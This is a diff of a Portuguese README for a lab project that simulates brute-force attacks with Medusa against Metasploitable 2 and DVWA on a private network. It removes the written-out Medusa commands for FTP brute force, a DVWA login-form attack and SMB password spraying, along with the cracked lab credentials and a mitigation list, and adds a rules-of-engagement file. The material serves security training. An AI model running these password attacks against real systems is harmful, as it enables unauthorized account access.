@@ -23,10 +23,6 @@ Este projeto serve para simulação de ataques de força bruta em ambiente contr
   - DVWA (Web)
   - SMB
 
-Print exemplo:
-
-(images/ambiente.png)
-
 ---
 
 ✅ 3. Ferramentas Utilizadas
@@ -42,70 +38,22 @@ Print exemplo:
 - Os codigos executados nos ataques FTP, DVWA e SMB estão organizados na pasta cenário devidamentes agrupadas nas respectivas subpastas (ftp,smb,web-dvwa).
 
 ### **4.1 FTP - Força Bruta**
-Comando:
-```bash
-medusa -h 192.168.56.102 -u msfadmin -P wordlists/ftp.txt -M ftp
-```
-- `-h`: Host alvo
-- `-u`: Usuário
-- `-P`: Wordlist
-- `-M`: Módulo (ftp)
 
-**Print exemplo:**
-```
-(images/ftp-attack.png)
-```
+**O PASSO A PASSO DO ATAQUE FORÇA BRUTA AO FTP ESTA DETALHADO NA PASTA SCENARIOS\FTP**
 
 ---
 
 ### **4.2 DVWA - Login Web**
-Comando:
-```bash
-medusa -h 192.168.56.102 -u admin -P wordlists/web.txt -M http -m FORM:"/dvwa/login.php" -m DENY:"Login failed"
-```
 
-**Print exemplo:**
-```
-(images/dvwa-attack.png)
-```
-
+**O PASSO A PASSO DO ATAQUE FORÇA BRUTA AO FORMULARIO DE LOGIN DO DVWA ESTA DETALHADO NA PASTA SCENARIOS\WEB-DVWA**
 ---
 
 ### **4.3 SMB - Password Spraying**
-Comando:
-```bash
-medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M smbnt
-```
 
-**Print exemplo:**
-```
-(images/smb-attack.png)
-```
-
+**O PASSO A PASSO DO ATAQUE PASSWORD SPRAING EM SERVIÇO SMB ESTA DETALHADO NA PASTA SCENARIOS\SMB**
 ---
 
-✅ 5. Resultados**
-- FTP: Credenciais encontradas → `msfadmin:msfadmin`
-- DVWA: Login bem-sucedido com senha fraca.
-- SMB: Usuário válido identificado.
-
-**Print exemplo:**
-```
-(images/resultados.png)
-```
-
----
-
-✅ 6. Medidas de Mitigação**
-- Políticas de senha forte (mínimo 12 caracteres, complexidade).
-- Bloqueio após tentativas falhas.
-- CAPTCHA em formulários.
-- Monitoramento de logs e alertas.
-- Segmentação de rede e restrição de serviços.
-
----
-
-## ✅ **7. Estrutura do Repositório**
+## ✅ **5. Estrutura do Repositório**
 ```
 /projeto-medusa
     /images        # Capturas de tela
@@ -114,12 +62,13 @@ medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M sm
     README.md      # Documentação principal
     LICENSE
     LICENSE_PT-BR
+    rules_of_engagement.md
 
 ```
 
 ---
 
-✅ 9. Referências**
+✅ 6. Referências**
 - [Kali Linux](https://www.kali.org/)
 - [Medusa Tool](https://tools.kali.org/password-attacks/medusa)
 - [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
